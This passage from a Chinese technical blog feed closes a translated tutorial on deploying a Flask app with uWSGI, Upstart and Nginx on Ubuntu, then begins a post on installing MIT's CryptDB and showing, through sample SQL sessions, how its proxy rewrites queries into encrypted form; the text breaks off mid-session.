创建uWSGI配置文件</h3><p>我们已经测试了uWSGI能够为应用提供服务，但我们想要的是能够更健壮地长期使用它。我们可以创建一个uWSGI的配置文件并为其配置我们需要的选项。</p><p>把这个文件放到项目目录下，命名为<code>myproject.ini</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/myproject/myproject.ini</span><br></pre></td></tr></table></figure><p>在文件内，我们以<code>[uwsgi]</code>头开始，这样uWSGI知道如何应用设置。我们要指定<code>wsgi.py</code>中提及的模块，去掉扩展名：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">module</span> = wsgi</span><br></pre></td></tr></table></figure><p>接下来，我们要告诉uWSGI以master模式启动并产生五个工作进程用于处理实际请求。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">module</span> = wsgi</span><br><span class="line"></span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure><p>在测试中，我们把uWSGI放置到了一个网络端口上。然而，我们将要使用Nginx来处理实际的客户端连接，并把这些请求转发给uWSGI。因为这些组件都是在同一台电脑上操作的，建议使用Unix的socket，这样不仅安全而且速度更快。我们把这个socket称为<code>myproject.sock</code>，并放到当前目录中。</p><p>我们也要更改socket上的权限。后续因为我们要赋予uWSGI进程Nginx组权限，所以需要确保socket的组所有者能从中读写信息。我们还要增加”vacuum”选项，当进程停止时进行socket的清理工作：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">module</span> = wsgi</span><br><span class="line"></span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attr">socket</span> = myproject.sock</span><br><span class="line"><span class="attr">chmod-socket</span> = <span class="number">660</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>最后，我们需要设置<code>die-on-term</code>选项。因为Upstart初始化系统和uWSGI对不同进程信号有不同的处理。设置该选项可以让这两个系统组件一致，实现预期的行为：<br>（译者注：Upstart目前是Linux的一种启动方式，Upstart与uWSGI对于SIGTERM信号有不同的处理方式。为了解决这个差异让Upstart按预期运行，设置<code>die-on-term</code>选项，uWSGI会杀掉进程而不是重新加载。）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">module</span> = wsgi</span><br><span class="line"></span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attr">socket</span> = myproject.sock</span><br><span class="line"><span class="attr">chmod-socket</span> = <span class="number">660</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">die-on-term</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>你可能会注意到我们没有像在命令行中那样指定一种协议。这是因为默认情况下uWSGI使用<code>uwsgi</code>协议，这是一种设计用来与其他服务器通信的二进制协议。Nginx天生就使用这种协议，所以使用<code>uwsgi</code>要比强制使用HTTP通信更好。</p><p><code>myproject.ini</code>编辑完成后，保存并关闭该文件。</p><h2 id="七、创建Upstart脚本"><a href="#七、创建Upstart脚本" class="headerlink" title="七、创建Upstart脚本"></a>七、创建Upstart脚本</h2><p>接下来我们要编写Upstart脚本。创建Upstart脚本能够让Ubuntu的初始化系统自动启动uWSGI，不论服务器什么时候启动，都能为我们的Flask应用提供服务。</p><p>在<code>/etc/init</code>目录下创建一个以<code>.conf</code>为扩展名的脚本文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/init/myproject.conf</span><br></pre></td></tr></table></figure><p>最开始我们要添加一个简单的描述，说明该该脚本的用途。然后定义这个脚本启动和停止的条件。正常系统的runtime数量为2，3，4和5，所以我们要告诉系统当达到这其中的runlevel时启动我们的脚本。当处于其他runlevel时停止脚本（例如服务器重启，关闭或者单用户模式时）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">description "uWSGI server instance configured to serve myproject"</span><br><span class="line"></span><br><span class="line">start on runlevel [2345]</span><br><span class="line">stop on runlevel [!2345]</span><br></pre></td></tr></table></figure><p>接下来，我们需要定义应作为uWSGI运行的用户和组。我们的项目是由自己的账号拥有的，所以我们应该让自己作为运行uWSGI的用户。Nginx服务器运行在<code>www-data</code>组下。要让Nginx能够读写socket文件，我们要赋予这个进程的组权限。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">description "uWSGI server instance configured to serve myproject"</span><br><span class="line"></span><br><span class="line">start on runlevel [2345]</span><br><span class="line">stop on runlevel [!2345]</span><br><span class="line"></span><br><span class="line">setuid user    # 注意替换成自己的用户名</span><br><span class="line">setgid www-data</span><br></pre></td></tr></table></figure><p>接下来，我们要设置进程让它能够正确地找到我们的文件并进行处理。我们已经在虚拟环境中安装了所有Python组件，所以我们需要设置一个环境变量作为虚拟环境的路径。我们还需要改变目录进入项目目录。然后，简单地调用uWSGI并把写好的配置文件作为参数传递给它：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">description "uWSGI server instance configured to serve myproject"</span><br><span class="line"></span><br><span class="line">start on runlevel [2345]</span><br><span class="line">stop on runlevel [!2345]</span><br><span class="line"></span><br><span class="line">setuid user    # 注意把user替换成自己的用户名</span><br><span class="line">setgid www-data</span><br><span class="line"></span><br><span class="line">env PATH=/home/user/myproject/myprojectenv/bin    # 注意把user替换成自己的用户名</span><br><span class="line">chdir /home/user/myproject                        # 注意把user替换成自己的用户名</span><br><span class="line">exec uwsgi --ini myproject.ini</span><br></pre></td></tr></table></figure><p>编辑完成后，保存并关闭文件。</p><p>输入以下命令可以快速启动uWSGI进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo start myproject</span><br></pre></td></tr></table></figure><h2 id="八、配置Nginx代理"><a href="#八、配置Nginx代理" class="headerlink" title="八、配置Nginx代理"></a>八、配置Nginx代理</h2><p>我们的uWSGI服务现在应该启动并运行了，等待着项目目录下socket文件中的请求。我们需要配置Nginx使用<code>uwsgi</code>协议向socket转发Web请求。</p><p>首先在Nginx的<code>sites-available</code>目录下创建一个新的服务块配置文件。为了与该指南其他部分一致，我们把该配置文件命名为<code>myproject</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/nginx/sites-available/myproject</span><br></pre></td></tr></table></figure><p>创建服务器代码块告诉Nginx监听默认的80端口。我们也需要告诉它使用这个代码块来处理访问服务器域名或者IP地址的请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name server_domain_or_IP;    # 注意替换 server_domain_or_IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要添加的另一项是一个能够匹配所有请求的本地代码块。在代码块内，需要包含<code>uwsgi_params</code>文件，该文件指定了一些常见需要设置的uWSGI参数。然后向<code>uwsgi_pass</code>定义的socket传递请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name server_domain_or_IP;    # 注意替换 server_domain_or_IP</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:/home/user/myproject/myproject.sock; # 注意把user替换成自己的用户名</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上，这就是为我们的应用所要做的所有工作。编辑完成后保存并关闭该文件。</p><p>为了能够启用我们刚刚创建的Nginx服务块配置文件，还要把它链接到<code>sites-enabled</code>目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/nginx/sites-available/myproject /etc/nginx/sites-enabled</span><br></pre></td></tr></table></figure><p>使用该目录下的文件，我们可以用以下命令测试语法是否有错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><p>如果返回的结果没有问题，我们可以重启Nginx进程以便重新加载新的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx restart</span><br></pre></td></tr></table></figure><p>现在你应该可以在浏览器中访问服务器域名或IP地址查看你的应用了：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-28_000000_test_app.webp" alt="显示内容" title="显示内容"></p><h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>本指南中，我们使用Python的虚拟环境创建了一个简单的Flask应用。我们创建了WSGI入口点，所有WSGI能支持的应用服务都能与它交互，然后配置了uWSGI服务来提供这个功能。之后，我们创建了Upstart脚本，能够在系统启动时自动启动服务。我们创建了Nginx服务块转发外部请求，能够把Web客户端的流量转发到应用服务中。</p><p>Flask是一个非常简单而又非常灵活的框架，这意味着你的应用功能不会过多的受限于它的结构和设计。你可以使用本指南中描述的内容为你的Flask应用提供服务支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;英文链接：&lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu-14-04&quot; targ
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Ubuntu" scheme="https://g2ex.top/tags/Ubuntu/"/>
    
      <category term="Flask" scheme="https://g2ex.top/tags/Flask/"/>
    
      <category term="Nginx" scheme="https://g2ex.top/tags/Nginx/"/>
    
      <category term="uWSGI" scheme="https://g2ex.top/tags/uWSGI/"/>
    
  </entry>
  
  <entry>
    <title>CryptDB的安装与使用</title>
    <link href="https://g2ex.top/2015/10/23/CryptDB-Notes/"/>
    <id>https://g2ex.top/2015/10/23/CryptDB-Notes/</id>
    <published>2015-10-23T22:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、CryptDB介绍"><a href="#一、CryptDB介绍" class="headerlink" title="一、CryptDB介绍"></a>一、CryptDB介绍</h2><p>CryptDB是来自MIT的一个开源项目，它不是某种数据库，而是加密数据库查询技术的一种，可以在加密的数据库（目前支持MySQL）上进行简单的操作。正常说来，一个应用是直接连接数据库的，配置了CryptDB后，CryptDB作为应用和数据库的中间代理，以明文的方式与应用交互，以密文的方式与数据库交互。其原理示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-22_162200_cryptdbdiag.webp" alt="CryptDB原理图" title="CryptDB原理图"></p><p>CryptDB首次解决了实用性的问题，它将数据嵌套进多个加密层，每层使用不同的密钥，这些加密密钥与用户的密码有关，即便是数据库管理员也不能访问这些加密的数据，这也防止了因数据库泄露导致用户信息泄露的问题。虽然目前支持的SQL语句有限，还没有到真正投入使用的程度，但其性却非常出众。Google也根据CryptDB的设计开发了<a href="https://github.com/google/encrypted-bigquery-client" title="Google Encrypted BigQuery" target="_blank" rel="noopener">Encrypted BigQuery client</a>。</p><p>CryptDB官网的介绍如下：</p><blockquote><p>Online applications are vulnerable to theft of sensitive information because adversaries can exploit software bugs to gain access to private data, and because curious or malicious administrators may capture and leak data. CryptDB is a system that provides practical and provable confidentiality in the face of these attacks for applications backed by SQL databases. It works by executing SQL queries over encrypted data using a collection of efficient SQL-aware encryption schemes. CryptDB can also chain encryption keys to user passwords, so that a data item can be decrypted only by using the password of one of the users with access to that data. As a result, a database administrator never gets access to decrypted data, and even if all servers are compromised, an adversary cannot decrypt the data of any user who is not logged in. An analysis of a trace of 126 million SQL queries from a production MySQL server shows that CryptDB can support operations over encrypted data for 99.5% of the 128,840 columns seen in the trace. Our evaluation shows that CryptDB has low overhead, reducing throughput by 14.5% for phpBB, a web forum application, and by 26% for queries from TPC-C, compared to unmodified MySQL. Chaining encryption keys to user passwords requires 11-13 unique schema annotations to secure more than 20 sensitive fields and 2-7 lines of source code changes for three multi-user web applications.</p></blockquote><h2 id="二、安装CryptDB"><a href="#二、安装CryptDB" class="headerlink" title="二、安装CryptDB"></a>二、安装CryptDB</h2><p>安装系统：Ubuntu 12.04/13.04/14.04 x64</p><p>注：<code>gcc</code>和<code>MySQL</code>可以事先安装，也可以在安装CryptDB时自动安装。如果不更改CryptDB的默认密码<code>letmein</code>，那么配置<code>MySQL</code>时<code>root</code>用户密码也要设置为<code>letmein</code>。</p><h3 id="1-安装Git和ruby"><a href="#1-安装Git和ruby" class="headerlink" title="1) 安装Git和ruby"></a>1) 安装Git和ruby</h3><p>安装<code>git</code>是为了获取官网的源码，又因为CryptDB的安装脚本使用ruby语言编写，因此也需要安装<code>ruby</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git ruby</span><br></pre></td></tr></table></figure><h3 id="2-克隆CrpytDB代码"><a href="#2-克隆CrpytDB代码" class="headerlink" title="2) 克隆CrpytDB代码"></a>2) 克隆CrpytDB代码</h3><p>这里把CryptDB项目克隆到了用户主目录下，后续步骤中也安装到了这个目录。根据个人喜好，可以自定义安装目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> -b public git://g.csail.mit.edu/cryptdb</span><br></pre></td></tr></table></figure><h3 id="3-安装CrpytDB"><a href="#3-安装CrpytDB" class="headerlink" title="3) 安装CrpytDB"></a>3) 安装CrpytDB</h3><p>安装非常简单，执行安装脚本，按照提示，等待完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> cryptdb</span><br><span class="line">$ sudo ./scripts/install.rb .</span><br></pre></td></tr></table></figure><p>如果安装过程中出现问题，请翻阅下文中的<code>可能出现的问题</code>一节。</p><h3 id="4-添加环境变量EDBDIR到-bashrc"><a href="#4-添加环境变量EDBDIR到-bashrc" class="headerlink" title="4) 添加环境变量EDBDIR到.bashrc"></a>4) 添加环境变量<code>EDBDIR</code>到<code>.bashrc</code></h3><p>编辑用户主目录<code>/home/yourname/</code>下的<code>.bashrc</code>，把下面的代码添加到最后，注意把<code>/full/path/to/cryptdb/</code>替换为<code>CryptDB</code>的安装目录。后续步骤中出现的<code>/path/to/cryptdb/</code>也请注意替换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> EDBDIR=/full/path/to/cryptdb/</span><br></pre></td></tr></table></figure><h2 id="三、CryptDB的使用"><a href="#三、CryptDB的使用" class="headerlink" title="三、CryptDB的使用"></a>三、CryptDB的使用</h2><p>源码<code>doc/README</code>文档中介绍了CryptDB的三种使用方法，这里只介绍<code>Proxy</code>方法。其他两种分别是<code>Tests</code>和<code>Shell</code>方法，使用方法请参考CryptDB的说明文档。</p><h3 id="1-启用Proxy"><a href="#1-启用Proxy" class="headerlink" title="1) 启用Proxy"></a>1) 启用Proxy</h3><p>MySQL使用本地<code>3306</code>端口，CryptDB使用本地<code>3307</code>端口，CryptDB把<code>3307</code>端口的数据处理后通过<code>3306</code>端口与MySQL交互。</p><p>打开Terminal（我们称其为<code>Terminal 1</code>），替换CryptDB路径，复制后按<code>Shift + Insert</code>粘贴到Terminal中并执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/path/to/cryptdb/bins/proxy-bin/bin/mysql-proxy  \</span><br><span class="line">   --plugins=proxy --event-threads=4             \</span><br><span class="line">   --max-open-files=1024                         \</span><br><span class="line">   --proxy-lua-script=<span class="variable">$EDBDIR</span>/mysqlproxy/wrapper.lua \</span><br><span class="line">   --proxy-address=127.0.0.1:3307                \</span><br><span class="line">   --proxy-backend-addresses=localhost:3306</span><br></pre></td></tr></table></figure><p>如果执行成功，<code>Terminal 1</code>中会显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2015-10-22 23:26:30: (critical) plugin proxy 0.8.4 started</span><br></pre></td></tr></table></figure><h3 id="2-连接到CryptDB"><a href="#2-连接到CryptDB" class="headerlink" title="2) 连接到CryptDB"></a>2) 连接到CryptDB</h3><p>接下来另外打开一个Terminal（我们称其为<code>Terminal 2</code>）连接到本机<code>3307</code>端口的CryptDB。如果想直连MySQL，使用默认的<code>mysql -u root -p</code>即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pletmein -h 127.0.0.1 -P 3307</span><br><span class="line"><span class="comment"># 或者隐藏密码登录</span></span><br><span class="line">mysql -u root -p -h 127.0.0.1 -P 3307</span><br><span class="line">Enter password:</span><br></pre></td></tr></table></figure><p>默认用户名密码：<code>root</code>/<code>letmein</code>，如果登陆出现问题，请确认<code>MySQL</code> <code>root</code>用户的密码与<code>CryptDB</code>的密码相同。</p><h3 id="3-CryptDB使用演示"><a href="#3-CryptDB使用演示" class="headerlink" title="3) CryptDB使用演示"></a>3) CryptDB使用演示</h3><p>现在，Ubuntu中已经有两个Terminal了，一个启用3307端口代理的<code>Terminal 1</code>，另一个是与CryptDB建立连接的<code>Terminal 2</code>。以下在<code>Terminal 2</code>中查询、创建数据库表、增加记录、查询记录，可以看到<code>Terminal 1</code>中会有CryptDB对应的操作。</p><p>Terminal 2，查询数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| cryptdb_udf        |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| remote_db          |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.02</span> sec):</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB查询数据库结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">show</span> <span class="keyword">databases</span></span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">show</span> <span class="keyword">databases</span></span><br></pre></td></tr></table></figure><p>Terminal 2，创建数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database test;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB创建数据库结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span></span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">create</span> <span class="keyword">database</span> <span class="string">`test`</span></span><br><span class="line">ENCRYPTED RESULTS:</span><br><span class="line">+</span><br><span class="line">|</span><br><span class="line">+</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>Terminal 2，打开刚创建的数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB打开数据库结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">show</span> <span class="keyword">tables</span></span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">show</span> <span class="keyword">tables</span></span><br><span class="line">ENCRYPTED RESULTS:</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">|Tables_in_test      |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure><p>Terminal 2，新建数据库表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users(id int(2) not null primary key auto_increment,username varchar(40),password varchar(40));</span><br><span class="line">Query OK, 0 rows affected (0.08 sec)</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB新建数据库表结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">2</span>) <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> auto_increment,username <span class="built_in">varchar</span>(<span class="number">40</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">40</span>))</span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">create</span> <span class="keyword">table</span> table_XOJUPFKJFH (MZJAQVYXMSoPLAIN <span class="built_in">INT</span>(<span class="number">2</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment, ZJPTNSDEPOoEq VARBINARY(<span class="number">80</span>), UBPDDGBBFPoOrder <span class="built_in">BIGINT</span> <span class="keyword">unsigned</span>, cdb_saltOLGYFXFRJM <span class="built_in">BIGINT</span>(<span class="number">8</span>) <span class="keyword">unsigned</span>, NCWFXJZAQOoEq VARBINARY(<span class="number">80</span>), QKRGQVOTWToOrder <span class="built_in">BIGINT</span> <span class="keyword">unsigned</span>, cdb_saltUWACWHCBBL <span class="built_in">BIGINT</span>(<span class="number">8</span>) <span class="keyword">unsigned</span>, PRIMARY <span class="keyword">KEY</span> index_16383471738825684568 (MZJAQVYXMSoPLAIN)) AUTO_INCREMENT=<span class="number">0</span> <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span></span><br><span class="line">ENCRYPTED RESULTS:</span><br><span class="line">+</span><br><span class="line">|</span><br><span class="line">+</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>Terminal 2：表中增加记录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users(username,password) values("foo","123456");</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB增加记录结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">"foo"</span>,<span class="string">"123456"</span>)</span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span> (<span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`ZJPTNSDEPOoEq`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`UBPDDGBBFPoOrder`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`cdb_saltOLGYFXFRJM`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`NCWFXJZAQOoEq`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`QKRGQVOTWToOrder`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`cdb_saltUWACWHCBBL`</span>, <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`MZJAQVYXMSoPLAIN`</span>) <span class="keyword">values</span> (<span class="string">'?\Z??-;??|?m???]??\\pV??O?GP$?u???t???????????T??p'</span>, <span class="number">6053682719380228167</span>, <span class="number">11367024404434184659</span>, <span class="string">'?T?? r?????\nc??O$??R\n??bU?????o?*)FD??\n|?*?9????'</span>, <span class="number">2215019363748817985</span>, <span class="number">12229882942316980603</span>, <span class="string">'\'</span><span class="number">0</span>\<span class="string">''</span>)</span><br><span class="line">ENCRYPTED RESULTS:</span><br><span class="line">+</span><br><span class="line">|</span><br><span class="line">+</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>Terminal 2，查询表中的记录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| 1    | foo      | 123456   |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure><p>Terminal 1，CryptDB查询记录结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QUERY: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">NEW</span> <span class="keyword">QUERY</span>: <span class="keyword">select</span> <span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`MZJAQVYXMSoPLAIN`</span>,<span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`ZJPTNSDEPOoEq`</span>,<span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`cdb_saltOLGYFXFRJM`</span>,<span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`NCWFXJZAQOoEq`</span>,<span class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span>.<span class="string">`cdb_saltUWACWHCBBL`</span> <span class="keyword">from</span> <span 